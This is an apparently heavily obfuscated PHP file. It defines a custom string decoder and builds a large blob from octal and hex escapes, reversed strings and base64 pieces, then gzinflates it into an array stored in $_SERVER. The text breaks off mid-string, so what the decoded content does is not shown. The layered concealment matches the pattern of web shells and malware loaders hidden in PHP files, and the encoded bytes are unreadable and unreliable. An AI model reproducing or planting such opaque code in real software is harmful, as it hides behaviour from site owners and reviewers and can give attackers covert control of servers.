<?php
 goto fπï‡‡Ÿ∞π; fπï‡‡Ÿ∞π: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\366\221\333\354\332\266", "\346\372\273\217\305\314"); $_SERVER[ˆë€Ï⁄∂] = explode("\174\4\174\4\174\2", gzinflate(substr(strrev('ñ2glrHÂ≤%mñYÏq!glZ\'lHc Ÿ^Ö(Bº(^8µ’|yΩÕ'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'ã')."\306\322\304\222\106\326\214\274\144\43\204\255\54\41\241\354\73\55\320\206\266\220\260\357\55\120\226\262\227\362\240\120\112\113\41\166\102\241\320\362\12\205\102\341\167\227\163\227\31\311\360\176\237"."\xef\xf7\x8f\x6f\x20\xd1\xdc\xfd\xde\x73\xcf\x3d\xf7\xdc\x73\xcf\x3d\xe7\x93\xb7\x3e\xfd\xe8\xf3\xdf\x6c\xd8\xf\xfd\xb7\xef\xd9\x97\xfe\xe1\xc3\xc7\x3e\xa3\xdf\xe4\xef\xfe\xf4\xfb\xb8\x73\xf\xf8\x1a\xf9\x73\xd8"."\271\347\124\127\267\317\233\62\253\363\233\333\356\270\131\273\111\373\251\266\65\32\171\372\231\360\301\317\375\174\111\150\342\372\247\307\46\366\371\332\167\36\350\371\237\6\224\231\226\155\240\77\112"."\xde\xb4\x15\x7d\xd4\xb0\x6c\x8b\x46\x24\xcd\xfc\x80\x91\xa6\xdf\x46\x9e\xfe\xfa\xe9\x4f\x77\x2c\x52\xd4\x73\xa6\xad\xd3\xa0\x8f\xfe\xa8\xbc\x5f\xe8\x5f\x6b\x28\x6b\xb0\x74\xb5\x33\x9a\x50\xe3\xdd\x5d\x5d\xa1\x58".base64_decode('AjI1yOk5MwVfBa2o5aD9gl60UG/k6tSCWdDzjhgRkdJsrV+zoKaWZrUl1BWJrlITq7pCkKM=')."\x5f\x1d\x2a\xe9\xc5\x31\x1a\x22\x9f\x71\x5b\x2b\xda\x9\x23\xa7\xf3\x1c\x23\x45\xde\xaf\xe6\x50\x5b\xb8\x53\x49\xc4\x2\x9d\xf1\x40\x30\x11\x8e\x76\xd2\xe8\x60\xb4\xa3\x23\x9c\x28\x8f\x8f\x45\x23\x91\xe6\x40\x70".strrev('JW˘:ñl•Úöh_‡ï'."\n".'«±›c^gË¶œCVè–‘£YM'."\r".'ejÃ‰j∫≤ˇPP÷–,WJyi').strrev(',kJÉ∏(L$PÒUCœZ&â5ı"j.‘h@“Oë¶Ÿ+CÙ±„TΩ∆úç(ãVÄYJ–').strrev(')WöS%¨h≤°S-'."\r".'Vs÷¡´&Q Jù/Ä)V±ëU7N‡§,Pˆä ã÷À4‰$¿°⁄').strrev('E[u¶§8√CﬁpÙÎèVFjñÒ≠≠¢OHÔ@£(jÍ[IöT>Û3ó3IB')."\x4b\xc3\x46\x2d\x1\xa2\x36\x7\xe2\xe1\xa0\xda\x15\x48\xb4\x3\xe4\xa\x5\xbf\x95\x1a\xb4\xfc\x5a\x31\x99\x31\x86\xf5\x88\xd1\xef\xef\x37\xf2\x7e\x8c\xa0\xbe\x7e\xb6\x94\xa6\xd0\x9f\x39\x30\x8e\x8c\x9e\x1c\x54"."\265\176\263\150\353\200\6\245\174\326\310\17\312\75\201\111\130\26\101\20\233\15\353\310\21\112\15\144\155\165\130\313\226\330\162\202\342\125\360\3\277\246\5\75\37\62\362\106\11\226\23\124\141"."\232\174\371\303\107\211\345\326\131\214\236\202\217\34\52\157\102\271\176\210\353\147\271\326\262\17\3\201\153\230\176\66\55\242\277\13\241\174\77\6\345\260\136\264\125\75\237\64\123\106\36\350\315"."\142\130\67\232\235\151\51\42\20\26\141\2\314\154\212\175\133\216\151\351\54\345\344\54\74\210\46\40\233\52\62\22\361\145\71\151\60\302\51\16\316\53\102\5\324\223\15\214\130\31\3\143\202"."\x64\xe0\x7c\x5d\x3c\xd5\x32\x4b\xc5\x24\x42\xa0\x1\x0\x4b\x1d\x44\xeb\xb6\x8d\x6\xc7\x0\x62\x76\x17\xb2\xa6\x96\x8a\xeb\x45\x3e\x34\xc3\x6c\x45\x15\x45\x4b\xb6\x1c\x59\x22\xd9\x5a\xcd\x62\xae\x5\xe1\x8e\x1c"."\327\201\226\267\41\42\7\331\262\116\111\320\362\127\367\234\352\375\274\257\347\44\364\117\15\120\356\136\350\117\106\317\146\125\175\124\207\165\237\113\315\265\30\40\374\26\106\126\24\103\203\341\250"."\232\321\254\114\107\152\256\112\112\101\167\363\51\175\324\127\310\24\150\120\120\244\136\206\75\144\135\142\260\165\232\166\110\332\126\262\146\122\313\312\103\241\337\31\333\56\304\365\174\252\225\343\171"."\xca\x1c\xc9\x13\x28\x15\x74\xb6\x24\x5a\x3c\x4a\x4a\xe9\x50\x56\x29\xed\xd\x46\x83\xc5\xa\xe6\xb2\xfc\x8b\x8d\x8e\xc7\x59\x3c\xd2\x1e\x65\x53\x99\x1a\x0\x4c\x65\x4b\x71\x1a\x34\x68\x58\x84\x40\xb\xea\x82\x56"._kodDe('LcdjWzlSp+7Xw1dex1agZghb/hX9q4RqVnl0BQmdvoEoi77PFMJZDDn36hdWBL6FlXyzaNr0')."\20\232\151\13\25\214\64\270\231\231\115\45\173\300\73\237\55\114\236\273\250\345\255\1\275\350\15\301\252\150\120\120\147\71\21\147\331\132\14\253\140\132\6\356\136\203\242\331\266\226\314\140\2"."\x28\xaa\x6f\xfa\x92\xfc\x6\x26\x2f\x7a\x79\x5e\x54\x89\xee\xed\x2a\x6a\xe9\x9c\xd6\xa0\x14\x4a\xfd\x8\x0\xb0\x18\x21\x2e\x89\x73\xc8\x99\x1\x0\xd\x4a\x4e\x1b\xf5\x6a\x69\x56\x53\x68\xb4\x60\x14\x75\x8b\x8d"."\x5a\x69\xeb\x48\x0\x46\xd\x78\x3b\xf0\x22\x32\xf4\x94\x37\x8e\x76\x18\xa8\x6c\x76\xed\x1c\x5\xe1\x8a\xc2\xd2\x68\x6c\x7b\x22\xd1\xa5\x86\x5b\x11\xb\xd1\x19\x52\x3b\x2\x89\x20\x10\xd9\x90\xad\xa5\x59\xd5\x11"."\264\157\360\52\131\344\112\57\132\114\30\233\72\321\340\104\144\227\71\242\27\121\303\315\143\15\312\240\231\352\67\107\175\54\251\25\210\75\313\214\347\267\140\173\143\132\76\215\207\321\77\146\353".strrev('∑ıîg0è$˛"±5¥x‘≈-ä;´ÌßœD~Ì8k0ã0_ØÆW@7√Ü#5.ÇsÄ')."\236\365\306\364\24\2\142\322\146\345\264\202\200\376\112\57\136\60\270\161\226\212\27\21\113\213\204\333\60\354\132\274\26\312\344\225\163\261\272\43\106\316\300\303\263\171\12\1\66\142\136\332\240"."\103\176\62\346\246\136\153\146\165\157\152\126\215\27\375\73\263\246\247\267\305\67\263\157\261\337\20\145\374\165\276\72\245\276\166\236\322\205\270\51\103\313\52\60\350\262\34\265\112\164\251\23\54".base64_decode('AsPzZl6vuLAQIpmW7m3XNUSg0UQ45sXD2qLhL4Eu3iclWuKaFxoZCy3rDsUTakco0R5tge4=')."\x87\x2\xf0\x95\x47\x85\x49\x7f\xd9\x1c\x63\xe6\x91\x7e\x22\x18\xc3\x7\x23\x33\x18\xe2\x62\x1f\x48\xca\x0\x21\xe5\x3a\xcd\x91\xd\x40\xf9\x5d\x8\x14\xc4\xbc\xc0\x24\x69\xe8\xb\x46\x63\x52\xba\xc4\xa6\xae\x87".base64_decode('/vQBNvfRH9WwWqU9Ewc5fVXN/rUIszp0tolAS+EcWsOi56pzg2PD6hCYjpbMCiPFd0AUbNc=').strrev('ò	éã 9àcZ˜¡-XÑ`ÖN√ı S"q\\~˜Ñ%≤Ä6ùs˚LYj,÷fíÍ‡j:tç')."\x61\x98\x16\xd8\x73\x21\xe4\x57\x31\xae\xf6\xfa\xa\xf9\x74\xcd\x9\x50\x97\x5a\x3f\xb7\x16\x47\xc0\x34\xc2\xc8\xd0\x1\xa0\xa4\x97\xf\xdd\x97\x34\xd1\xc2\xee\xd0\x6\xf5\x6\x3c\x16\xa0\x66\xb\x49\x2c\xb\x48"."\4\163\41\336\343\232\334\164\1\117\117\326\227\103\225\220\72\203\46\337\225\351\21\13\30\40\266\307\51\172\261\150\26\247\102\16\362\255\220\215\22\117\27\124\156\163\226\303\102\44\200\175\147"."\114\316\242\230\14\31\33\374\60\356\351\365\255\100\66\122\210\125\363\131\66\232\4\64\100\55\225\252\24\215\110\15\124\260\201\341\51\111\240\201\160\324\37\237\215\376\27\233\176\312\314\151\154".strrev(':2¡ÍœJAÉ9‡0Ñi–òÕ$"r:,N&⁄,ö…öç4WE—ç—OQ}ëã7áî≈')."\xe3\x2d\x6a\x21\x1b\x9a\x19\x8e\x7e\x82\x9f\x46\x27\x1c\x14\x2b\x18\x3a\xc3\x8a\xa1\x92\x98\x13\x60\xe1\x15\xf8\x48\x28\x22\x30\x3b\x4\x78\x25\x3e\xb3\x68\x56\xa3\x64\x41\x89\x70\x57\x51\x1f\x30\x80\xa0\xe7\x11".base64_decode('YejQioNsYKikWIo4IC3T1u5IRA1GOxPoREljVsTCCSBjMUSO1ECwC0KC6HGOTeY5aMxwPaA=')."\20\352\204\137\60\107\150\167\56\230\171\104\132\201\72\171\305\171\263\54\51\45\170\7\300\35\301\157\270\130\10\304\4\344\326\171\163\210\256\170\171\237\272\272\23\260\74\1\53\30\17\334\74"."\x86\xd9\x5b\x98\x7c\x23\x9d\x5f\xce\x67\x7e\x45\x7c\x8e\xb7\xbd\x23\x10\xf4\xc6\xdb\x3\xf5\x73\xe7\xd1\xd8\x55\xb9\x54\x6f\xa2\xdd\xb0\x7a\x4f\xe6\x61\xe8\xce\x88\x35\x47\x2d\xea\x68\x4d\x33\x5c\xa8\xaf\xad\x63"."\53\16\61\42\232\350\371\52\157\316\213\153\301\74\244\257\266\266\226\325\65\153\236\222\101\244\144\3\43\330\51\62\132\166\254\51\45\7\31\342\21\372\155\171\107\14\106\363\116\340\374\367\11"."\xe5\xc0\xb7\x4a\x64\x3b\x53\xb5\x24\xae\x4e\x45\x85\xed\x92\x25\x43\xa\x21\x60\xa\x15\x31\x18\x5b\x4c\x63\xb5\x6c\xda\x44\x78\x97\xc9\xc9\x91\x29\x8e\xbf\x34\xac\x53\x1e\xb\x1a\xca\x68\x1c\x4e\x18\x7a\x6c\x71"."\40\16\156\114\56\204\301\214\372\300\350\267\223\251\126\22\225\1\115\171\365\60\100\133\364\243\200\267\62\104\265\331\264\315\200\366\113\150\301\26\215\165\22\330\27\263\52\30\261\214\306\241\255".strrev('õ?ùÖ*⁄æuUMÛ2_,aï£„O6Ëµ≈£øÅÄÁiNUogaJ*£LyF'."\0".'&'."\0".'¥úV\\—')."\252\272\23\255\210\43\137\274\150\112\143\320\314\25\60\75\41\207\55\74\120\212\262\213\340\350\336\210\271\35\26\350\162\301\41\224\320\140\273\151\364\313\371\32\375\223\325\12\103\301\54\330\112"."\265\53\22\110\264\106\143\35\200\334\205\202\300\247\102\262\322\62\363\12\122\124\262\274\72\346\210\1\375\265\144\326\205\233\62\54\126\126\104\301\225\225\120\160\245\13\5\127\226\243\340\312\112"."\x8\x36\xc\x98\xa8\xe5\xb4\x75\x66\x1e\x2d\x54\xb4\xc3\xe6\x7c\x49\x40\x8b\x44\x7b\xb8\x73\xa9\xda\x11\x6d\x9\x45\xd4\x70\x27\xe2\xdc\x12\xe5\xf1\xdd\x5d\x2d\x1\x46\xff\xe4\xf8\xe6\x28\x93\xb9\x40\x6c\x37\xe2"."\335\226\7\42\141\167\366\320\312\160\74\21\257\230\204\342\272\103\256\224\226\146\265\53\26\152\15\257\344\301\326\160\50\322\22\127\203\201\140\273\310\323\31\350\200\0\142\222\364\154\312\362\73".base64_decode('86uICY1zIaAKCAchh9xNZZIaVZBgdKDRYTpguFiMSkYCQtSkWeIsJTu959geiw5jAHZ2Eqk=')."\246\77\65\112\40\256\330\5\250\3\355\246\375\143\374\223\14\203\205\21\373\1\355\53\300\20\227\365\100\305\171\232\245\143\117\345\210\300\200\315\131\120\127\30\355\35\42\15\315\100\200\310\153"."\x11\x26\x90\x19\x81\x66\xc\xb4\x13\x15\xed\x0\xeb\xce\x80\x90\x95\xaa\xd1\xae\x50\x2c\x80\x25\xad\xea\x8a\x58\xb4\xb3\xd\xa\x8c\x64\x74\xd6\x81\x30\x80\xbf\x9a\x9d\x43\x41\xe0\x6a\x8b\xd\x5d\xcb\x1a\x1a\x93"."\150\11\240\257\65\31\50\321\331\33\232\323\363\14\316\375\230\233\261\131\367\340\143\0\55\144\370\114\231\45\136\177\277\151\102\235\131\174\344\242\237\150\315\160\21\355\132\213\241\305\50\333\233"."\x67\x6d\x60\x7b\x17\x20\x6b\x74\x69\xa8\x53\x65\xb8\x44\x43\x12\xfe\xd1\x88\x50\x2c\x16\x8d\x1\x8\x6c\x73\x90\x89\xbd\x68\x62\x2c\x14\xf\x25\x58\xdb\x43\x25\x83\x1\xc8\xef\x9b\x5\x78\xab\x23\x7e\xe\x9a\xf7".strrev('Ì‡]ÎW]ÊùwÄûÜ‚ı^˛Ω'."\r".'5≈≠´f4ºäóf∆A˙ıA¢O35CÎÂù„›UôÓØ')."\103\314\171\315\54\210\350\133\137\357\231\263\21\147\100\31\27\37\337\207\176\232\172\27\117\357\365\316\330\264\346\244\236\336\276\252\206\131\123\173\175\307\367\216\364\315\254\131\314\332\111\226\212"."\x88\xff\x67\x9b\x1a\xea\x6a\x6a\x56\x35\xea\x12\x3a\xa1\xf2\x2c\x79\x89\x14\x93\xc\x2c\x61\x9d\x51\x10\xb1\xeb\xe7\x6d\x64\xf1\x68\xe\xf5\xb4\x28\xd1\xe3\xed\x9d\xd5\xb7\x58\x2a\x27\x45\xb9\xdb\x42\xd4\x14\x71"."\x7b\x19\x9e\x2f\xe0\x3d\x19\x8f\x8c\x17\xc5\x2b\x1d\xf0\xa3\x94\x4f\x8a\xd\x11\xaf\x84\x7e\x8d\x1f\xf5\xd2\x79\x71\xa4\xb2\x8b\x5c\x14\x3a\x8c\xb0\x53\xd0\xdc\xf5\xd3\xe9\xef\x46\x36\x91\x69\x1d\x96\x39\xb9\xae"."\141\234\124\51\157\14\261\263\115\136\37\202\17\323\346\30\255\333\43\72\103\17\24\357\10\43\344\140\373\0\112\222\102\131\151\337\40\162\53\216\243\34\231\214\202\212\217\171\43\74\204\266\25".strrev('ØûÄ§!VP÷ÎX"2"ì$Ç( 	°†Ï_ô∞t&^–'."\n".'h êëÕ&™°\\z'."\n".'‘ï∑!ßò')."\310\35\227\125\52\340\243\222\202\146\34\301\126\101\254\233\322\264\110\241\40\147\127\1\362\4\24\370\21\10\13\65\165\261\350\61\115\202\76\25\304\14\131\350\10\302\16\1\376\352\336\336\122".strrev('pQL¸ã4dÌn\\G∏|%mPî· fÕT[náÙ^˛\'√Xﬁœ÷˙yØàAÎÍûè').base64_decode('6m3T1rKOKhI4BqaZ82IgxaXzHhG0CzMd0oUVIaWdXGrKmWHpJgKXiOu2j+fwSIkqCjsuD5s=').base64_decode('QCI7YOTRwgpK2xyVo8eJLMBxy2Xp+LaltZTN2lwEkzUGoQVYNXDp5qU/yqxKRdFxhEkkZ0I=')."\67\246\315\254\224\61\234\317\233\251\176\31\351\304\6\333\26\100\254\114\102\251\146\27\57\112\270\123\151\216\106\43\241\100\247\202\367\162\330\203\20\243\20\17\165\5\320\6\206\145\233\361\104".strrev('gÜ}ƒzÛ8è'."\r".'2¡ÌzÉ¬æ`†,eOÇ4Sà»…¨’∑BÅËn¿l/JÔV^-¬¨Ó')."\xd8\xd0\x47\xc8\x7\x3f\x8f\x7a\xe0\x98\xea\x11\xd2\x18\xf8\xc\xb7\x78\xc\xab\x85\x1c\xb7\x49\x3\x24\x89\x75\xc1\xce\x60\x51\x73\x56\x1b\xf3\xd0\xee\x44\xf4\x61\x3d\xeb\x61\x72\x1a\xf\xeb\xa3\x87\x49\xa7\x3c"."\x44\xaa\xd4\x2\xdd\xea\x46\xb\xb\xba\x45\x3e\x11\xfd\xcc\x78\x30\x2\x61\xfc\xf5\x88\x1b\x16\x8f\x39\x92\xd7\x8b\x24\xb\x0\x46\x9c\xd4\x3d\xe2\x14\xef\x49\x17\xcd\x52\xa1\x8b\xb5\x29\x85\x68\xb7\x20\x42\xf4"."\x99\x47\xc4\x4c\xd3\xf6\x30\x81\x97\x47\x96\x7c\x41\x2f\x2\x6c\x9d\x54\x4\x67\xe5\xd1\x10\xf8\xbb\x3b\x1\xf8\x85\x93\xca\xa1\xf4\x15\x93\x55\x3e\x1f\x4e\xa1\xdf\x7a\x5a\x23\x48\x38\x37\xb2\xfd\xce\x91\x87\x8"."\xdf\x38\xe7\x89\x1\x2e\xbe\x96\x8b\x85\x8a\x7\xd0\xaa\xc1\x5d\x1e\xad\x56\xfe\xe6\x8\x9a\x77\x22\xaa\xb8\x50\x11\xd7\x68\x82\xcf\x75\xcb\x5f\xdc\x17\x6c\xb8\x51\x74\x98\x8a\x4b\xcd\xd9\x5a\x9a\xb5\x85\x89\x15".base64_decode('P2pVyEq/Y3pyLCkEOi2SmMgZanKOx0MWUCXkrzy5HKH5XEw58EAGXIblfGIdi+OrlyUMiNA=')."\276\150\101\360\21\264\263\230\376\306\321\276\326\232\145\320\250\227\223\201\362\172\234\41\274\252\174\204\22\223\73\365\70\27\41\106\102\255\11\145\111\24\221\55\303\124\151\31\25\147\126\310\77"."\146\136\161\324\315\300\245\64\221\164\21\326\362\51\32\263\6\221\370\65\115\323\130\43\323\34\305\5\176\70\73\341\141\101\107\153\142\252\145\40\140\74\40\303\27\333\22\213\212\212\135\260\4"."\xcc\x9f\x66\xc1\xc1\xb\xb\x60\xe1\x4b\x67\x71\x62\x6a\x65\x84\x94\xe8\x8c\x88\x60\xfd\x72\xb4\x8b\x83\x62\x31\x31\x94\x50\x70\x3\x50\x1\x61\x57\x30\x2d\xf1\x8a\x65\x21\x5\x9d\x20\x77\x61\xa4\x6b\xef\xc4\x20"."\352\62\362\143\106\76\156\140\271\202\73\166\3\337\176\305\356\217\127\265\10\121\254\234\354\233\356\36\130\270\100\353\367\300\145\260\7\53\47\110\73\263\20\146\242\336\23\105\211\234\343\142\241"."\xbc\xe7\x50\x91\x94\x45\x40\x0\x16\x32\x60\x7c\x46\x2b\xa\x60\x32\xf2\x83\x69\x0\x1f\x83\x85\xb3\x88\xa0\x94\x6d\x40\x1b\x16\x9c\x89\xa3\x8c\x44\x44\x2c\x7b\x8c\xf5\x5e\xfe\x74\x56\x4a\x83\x2d\x1e\xf2\xdb\x8e"."\72\57\57\127\76\75\45\324\163\226\211\322\36\104\13\42\10\126\350\207\14\44\141\172\260\44\37\375\320\375\233\351\4\220\114\14\357\113\271\26\270\31\300\337\313\21\1\0\304\301\0\257\146"."\x4\x4\xb8\x8\x55\x92\x3\x70\x2\xe4\xe4\x3\x68\x4f\x2\x9c\xae\x23\x96\x3d\x8b\xb6\xb1\xa2\xf\xaf\x91\x36\xbc\x19\x31\x98\x50\xf2\x26\xe3\x5c\x5c\x47\xe3\x84\xea\x45\xd\xf1\xb2\x34\x39\xb7\x10\xe7\x61\x3a"."\x2f\xf6\x5\x7e\x1d\xc6\x97\x98\x80\xaf\x58\x4f\x69\xd1\x21\xc\x4e\xb5\xbc\x1f\x18\x83\x2b\x87\x5b\x8b\x26\xe7\x6a\xf9\x96\xee\xce\x14\x24\x7\x48\x9b\xe5\x73\x6d\xc3\x12\x3c\x1c\xac\x43\x59\x94\x54\xc6\xcd\x44"."\xb8\x62\x5d\x41\xcc\x58\xb8\x96\xb5\xa4\x74\x40\x2e\x65\x8a\x74\xc7\xf2\xa1\xe3\x0\x68\xe8\x78\x6a\x25\xfe\x4a\xd0\x97\xf5\xf4\x62\xc\x76\xb8\x8d\xae\xf9\xb5\x4d\x13\x9d\x31\x8b\xbe\x22\x6a\x51\x74\x44\xa2\x6d"."\100\30\210\246\106\134\33\320\145\256\300\221\30\50\24\104\267\171\375\26\52\42\321\157\47\133\304\352\214\27\64\106\266\25\257\342\252\101\53\24\344\66\71\117\307\20\236\234\100\112\74\102\201"."\213\116\72\152\61\44\336\127\232\20\341\14\61\246\54\241\224\141\343\30\274\124\115\166\153\44\62\212\315\325\135\130\204\145\152\117\66\255\62\264\21\247\15\317\164\107\116\47\207\1\221\63\11"."\x37\xe0\x13\xc\x51\x65\xdd\xa6\xa4\x59\x0\x5c\x92\xf4\x12\x73\xe6\xb0\x2e\x45\xe2\xb\xbc\x82\x48\x91\x82\x34\x59\x4a\x12\x95\x4a\xb9\xf8\x54\x90\x1e\xa1\x95\x99\x22\x6c\xb4\x80\x2\xc9\xb\x65\xc9\x69\x9c\x2e".base64_decode('fh8+dfgElMMtgWKRoT4dJr5cRpFyFKaccbZuK+10tPLQsNA6pFXhhn2UcOAbzGierxfxXZ4=')."\125\226\105\126\256\50\56\156\361\235\241\312\331\3\331\254\320\273\162\207\47\55\102\11\206\134\110\216\231\264\130\53\71\0\63\225\205\112\161\374\350\63\71\73\357\276\111\167\22\371\311\271\35".base64_decode('tojdpxQ+jZXDaF8PZoy8zgQ2A0aRa/H+P8RWl0Mer5DJ0AWnSVJrrP08rMvnDC6oFaSKb/g=').base64_decode('UJ1gY4CVkAKq7eDGYqR+aTk5MAQtXwoPvNmFoz5rEpx15+NKKoQmjvI9Wi6Ek/BcypUK7u8=')."\x4b\xf2\xf3\xca\x5\x27\x28\xe7\x43\xb8\x8b\x13\x26\xeb\x2b\x4b\xe6\xb5\xfc\xed\x4f\xe7\x9f\x75\xdb\xeb\xf4\xfb\xae\x27\xb7\xfc\xe2\xcc\x3b\x1\x3d\x87\x86\xd3\x3\x6b\x1\xd6\x70\xc3\x45\xc4\x46\x5f\xa7\xdf\x42"."\23\376\214\225\143\346\61\117\374\347\67\176\277\351\320\252\273\366\17\35\154\304\156\150\271\365\246\51\361\306\23\226\34\156\206\27\35\355\77\363\376\333\167\137\161\373\302\247\137\135\165\101\342".strrev('Ò=èó„˛ö:ûœì“ˇwæ˜ô˜8oÁM˜{ÿÃ∂◊±ÎnæO˝˙˘=·uÚ?˚yÙ7ò^€ﬂ').strrev('€Y„xg~oèœf∑Àù‡˙ﬂ≥6Õóùˆ∆c<⁄iÕ÷„∞„>ˇµıˇ€Î}«Ö¬Ú~5«Ö«˙ø±˛')."\xfa\x76\x1f\x72\xf3\xa3\x2b\xbd\x7f\xff\xe2\xb5\xba\x33\x9b\xce\x7b\x62\x43\xcb\xd9\x73\xbf\xd7\xfc\x48\xd5\xd9\xef\xfc\xf6\xa1\x1b\x8a\xfb\x7c\x7c\xf8\x61\x63\x57\x35\xee\xde\xf1\x9a\xf2\x9b\xc7\xf\x6f\x8d\xbf"."\373\63\357\353\153\367\354\370\375\73\203\155\257\67\124\375\341\326\357\175\375\271\337\276\367\353\7\217\77\340\220\331\67\115\153\277\372\342\330\41\233\66\265\255\77\245\343\7\237\354\331\325\375"."\347\323\126\137\173\312\322\361\114\227\71\367\223\321\273\137\370\175\315\334\73\346\77\371\117\45\174\355\311\205\53\36\367\335\271\353\255\351\167\134\21\275\371\305\175\236\331\171\332\326\67\225\307"."\267\325\336\336\361\374\357\112\173\121\173\163\77\233\175\375\145\175\376\157\115\371\344\236\356\27\77\173\161\127\343\311\267\157\217\215\314\257\277\72\260\151\166\174\363\61\233\343\63\163\373\115\154"."\57\334\376\223\37\56\172\344\323\67\63\277\273\354\235\117\176\164\315\363\3\263\257\154\176\342\336\266\37\276\76\145\174\374\160\377\15\163\116\75\370\255\377\231\362\17\173\321\210\62\347\251\343".strrev('S)°Â|Ô_§Ê≠ºﬁw∂˝ˆ‹÷#âpˇÔıÿ~?—çÛ›77¸˚O3=µ˜=Cï˙{lw')."\xf0\x68\xfe\x7b\xf1\x77\x1f\xbf\x75\xd5\xef\xe\x7b\xf1\xb6\x3b\x8e\xbc\xf6\xbd\x65\xc7\xfc\x7d\xc1\xa9\xc1\x81\x13\x16\x9d\x39\x6f\x57\xd7\x29\xef\x4d\x59\xb0\x59\xeb\xe9\x3c\x65\xbf\x1b\x87\x83\x67\x7e\xef\xee"."\x73\xeb\xb6\x1e\xfe\xe3\xfd\x1e\xb9\xe4\xa0\x1b\x17\xb4\x6e\x7e\x68\xd1\xa2\xd3\xa7\x9f\xfe\xb7\x3b\x9e\x7f\xb9\xff\x98\x4f\xd7\x1c\xf9\x83\x1b\x5f\xb6\xef\x48\x1f\x75\xe6\x1f\xfe\xf2\xd0\xdb\xdf\xb6\x86\xe\x3e"."\76\330\260\164\373\222\133\216\171\170\341\217\357\337\247\372\347\132\377\327\247\76\160\352\117\276\365\310\103\243\153\356\325\123\201\364\345\177\330\225\135\32\73\360\310\345\217\76\125\177\306\337\175"."\x87\x25\xef\xbf\xf7\xca\xfb\xbb\xae\x7d\xa7\xfa\x96\x4d\x57\xf5\xb6\x1e\x7a\xa8\xf1\xdd\x46\xbd\xfa\xf4\x83\x9f\x3e\xaa\xaa\xe6\xac\xc7\x5b\x9f\x29\x3e\xbc\xee\x99\x96\x73\x7e\xfc\xe8\xb2\x8b\xee\x7a\x28\xf2\xeb"."\276\73\373\32\116\171\261\356\376\100\161\335\213\315\57\165\15\277\361\220\66\357\226\225\377\165\344\165\373\235\377\365\23\333\62\157\314\231\370\332\3\363\27\47\106\77\334\25\265\137\71\255\341"."\124\373\362\337\236\66\247\260\367\203\346\340\324\355\307\235\174\164\375\336\127\236\72\343\240\107\277\277\360\321\356\132\357\66\117\312\263\371\37\35\377\270\346\40\373\110\153\367\276\267\356\23\235"."\172\316\337\136\375\372\214\157\36\361\263\316\324\321\307\56\374\361\334\303\267\4\226\170\323\257\34\266\314\334\367\270\351\55\23\311\13\336\370\116\117\343\252\243\177\176\350\13\33\33\57\121\316".base64_decode('aT//R2cMPXmWNsXzROqhb256feU3/c8F3vjbRwcs/Nuz1raamx4745JX3ryj7runKSueeOw=')."\233\27\26\316\73\164\306\336\135\243\73\266\226\226\35\63\274\344\301\165\253\6\57\375\327\372\67\253\333\33\7\56\370\251\165\305\145\155\135\263\246\357\135\377\320\61\336\157\117\123\352\316\370"."\170\315\15\37\157\326\166\374\374\341\217\73\275\307\176\344\275\370\372\5\201\353\317\373\321\262\175\46\142\343\273\376\370\337\113\266\266\276\323\362\263\273\347\377\365\206\373\256\57\365\334\374\171".base64_decode('/8PNDx21Ov5oy8sf3dj+6vf9Z9635qndR+y/quY72+e23bhc9e73g4+GHtkv/PaC4LZZM74=')."\276\360\310\337\35\33\337\365\131\163\265\377\201\213\317\261\76\274\342\51\375\353\215\27\326\336\235\173\367\206\322\273\317\255\172\277\356\107\306\243\107\36\353\157\254\373\251\371\341\273\227\74\263"."\261\376\215\113\347\35\175\316\172\343\354\307\276\263\377\277\112\307\364\65\236\221\112\157\172\366\57\7\274\126\133\275\361\167\236\327\266\157\371\372\374\103\66\277\273\361\33\113\23\117\136\162\311"."\325\357\257\376\151\357\316\345\157\54\70\363\205\321\267\36\331\172\304\266\103\366\275\370\311\107\264\370\217\67\366\335\71\345\221\337\175\273\171\313\215\307\154\77\64\362\307\357\234\365\351\45\123"."\137\74\363\230\267\37\231\161\360\246\353\347\127\137\271\172\305\254\47\76\113\54\132\234\351\276\343\255\265\167\377\344\137\365\373\166\264\357\336\270\376\337\233\172\336\131\76\370\122\376\316\131\47"."\x1c\xb9\xcf\x13\x17\x2c\xb8\xed\x8f\xef\x7e\xb8\xea\xd7\x99\xf1\x7\x63\xb7\xaf\xca\x3d\x3a\xf5\xb1\x27\xae\x68\xf7\x24\x42\xf3\x1e\x69\x38\xe9\xac\x35\xdf\xfc\xcf\x37\xff\xb8\xef\xc4\xeb\x57\xde\x5b\x3a\x56\x53".base64_decode('d9z20d6PTt1n5uNvvTC/95k9F1RfOeuCj197s/GWGe+fvGLL+rvGgi8e4Dv5749vMc8oHbQ=')."\146\341\214\340\61\117\357\147\354\176\45\164\357\3\143\357\314\273\366\117\17\336\164\314\275\37\176\366\370\137\236\372\375\315\27\367\54\173\156\363\15\217\74\327\365\340\131\107\366\175\66\361\352"."\x63\xd7\x9e\x32\xf6\xe1\x5f\xde\x5f\xb1\xf3\xda\xd5\x9f\x7f\xf8\xf6\x89\xcf\xab\xbd\xf\x6e\xfa\xf7\x7b\x2f\xbd\xe3\x7f\x5e\xfd\xfc\x9d\xcf\x4e\x3b\xe2\x88\x6b\x3f\xff\xeb\x7\xe3\x3f\x7b\x7a\xf1\xe7\x6b\x4f\x8d"."\x7e\xfc\xfe\xd4\xc5\x1f\xff\xfb\xda\x6f\xfd\xfa\xea\x6b\x1f\xfb\xeb\x4f\x42\xd7\x74\xec\xb8\xec\xa4\xab\x1e\x6a\xfb\xfd\xa9\x17\xfd\x79\x43\xef\xc1\x9b\x2f\x78\xe6\x3b\xeb\x7e\xb3\xfe\xa9\x2d\x33\x16\x3e\x74\xdd".base64_decode('HQd+fKh981HfOGDvW19bN+vPUy/+9aaD7r79ruzpZ5f+47Ct9/5gzbefDa+Z4ju8qnjQ944=')."\175\362\203\37\306\256\151\176\241\357\127\127\65\106\36\274\375\266\217\62\177\375\350\247\313\237\371\376\35\127\76\275\163\361\311\253\172\232\136\331\371\341\314\320\213\243\127\171\374\127\244\327\377"."\276\375\314\351\155\341\165\267\36\335\32\210\326\265\256\136\220\270\370\260\33\26\277\171\360\111\231\243\367\371\40\261\44\163\301\222\47\147\76\372\373\75\377\330\174\371\13\107\334\331\176\300\71".strrev('˝ﬂØ¬√Ú±˚´∂·5¶√˙›∂Á≥Ô8éõú∆o